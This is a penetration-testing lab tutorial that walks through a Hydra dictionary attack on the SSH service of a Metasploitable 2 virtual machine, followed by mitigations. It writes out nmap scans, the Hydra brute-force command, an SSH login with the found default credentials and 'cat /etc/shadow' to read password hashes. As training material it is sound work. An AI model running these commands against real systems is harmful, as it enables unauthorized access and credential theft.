Author: Pradip Pandey
Difficulty: Intermediate
Estimated Time: 2 Hours

## 1. Project Overview
This project demonstrates a penetration testing lifecycle focusing on password auditing and dictionary attacks. We will target the SSH service of a vulnerable machine (Metasploitable 2) using Hydra from an attacker machine (Kali Linux). The goal is to identify weak credentials and report findings with mitigation strategies.

## 2. Lab Requirements & Setup
To replicate this lab, you need a virtualization environment. We will use **Hyper-V** (Windows) or **VirtualBox**.

### 2.1 Virtualization Platform (Hyper-V/VirtualBox)
1.  **Enable Hyper-V**:
    *   Open PowerShell as Admin: `Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All`
    *   Reboot.
2.  **Virtual Switch**:
    *   Create a "Private" or "Internal" switch named **PenTest_Net** to isolate traffic.
    *   *Why?* We are running vulnerable machines; do NOT bridge them to your home Wi-Fi.

### 2.2 Virtual Machines
1.  **Attacker (Kali Linux)**:
    *   Download Kali ISO.
    *   Create VM: 2GB RAM, 20GB HDD.
    *   Network: Connect to **PenTest_Net**.
    *   IP Configuration: Static IP `192.168.10.10/24`.
2.  **Target (Metasploitable 2)**:
    *   Download Metasploitable 2 Zip.
    *   Create VM: Use existing VMDK/VHD.
    *   Network: Connect to **PenTest_Net**.
    *   IP Configuration: Static IP `192.168.10.11/24` (or DHCP if configured).

## 3. Step-by-Step Implementation

### Phase 1: Reconnaissance (Nmap)
Before attacking, we must identify the target and open ports.

1.  Open Terminal in Kali.
2.  **Ping Sweep** to find target:
    `sudo nmap -sn 192.168.10.0/24`
    *Result:* You should see 192.168.10.11 is up.
3.  **Service Scan**:
    `sudo nmap -sV -p- 192.168.10.11`
    *   `-sV`: Detect service versions.
    *   `-p-`: Scan all 65535 ports.
    *   *Result:* Port 22/tcp is open (OpenSSH 4.7p1).

### Phase 2: Dictionary Attack (Hydra)
We will attempt to brute-force the SSH login.

1.  **Prepare Wordlists**:
    *   Usernames: Create `users.txt`.
        `echo -e "root\nadmin\nmsfadmin\nuser\ntest" > users.txt`
    *   Passwords: Use `rockyou.txt`.
        `gunzip /usr/share/wordlists/rockyou.txt.gz`
        `head -n 1000 /usr/share/wordlists/rockyou.txt > pass.txt` (Using top 1000 for speed).
2.  **Run Hydra**:
    `hydra -L users.txt -P pass.txt ssh://192.168.10.11 -V -f`
    *   `-L`: List of users.
    *   `-P`: List of passwords.
    *   `-V`: Verbose mode.
    *   `-f`: Stop on first found credential.
    *   `ssh://...`: Protocol and Target.
3.  **Review Output**:
    Hydra will display green text when a match is found:
    `[22][ssh] host: 192.168.10.11   login: msfadmin   password: msfadmin`

### Phase 3: Verification & Exploitation
1.  **Verify Access**:
    `ssh msfadmin@192.168.10.11`
    Enter password: `msfadmin`
2.  **Post-Exploitation**:
    *   Run `id` to check user privileges.
    *   Run `cat /etc/shadow` (if root) to see password hashes.

## 4. Mitigation Strategies (Defense)
As a defender, how do you stop this?

1.  **Disable Password Authentication**:
    *   Edit `/etc/ssh/sshd_config`:
        `PasswordAuthentication no`
        `PubkeyAuthentication yes`
2.  **Move SSH Port**:
    *   Change `Port 22` to `Port 2222` to avoid automated scanners.
3.  **Implement Fail2Ban**:
    *   Install: `sudo apt install fail2ban`
    *   Config: Blocks IP addresses after 3 failed login attempts.

## 5. Troubleshooting
*   **Target unreachable**: Check Virtual Switch settings. Ensure both VMs are on the same subnet.
*   **Hydra fails immediately**: Check if Port 22 is actually open (`telnet 192.168.10.11 22`).

## 6. Conclusion
This lab demonstrated how weak passwords can be easily compromised using automated tools. Strong mitigation involves disabling password-based logins and implementing Intrusion Prevention Systems (IPS) like Fail2Ban.
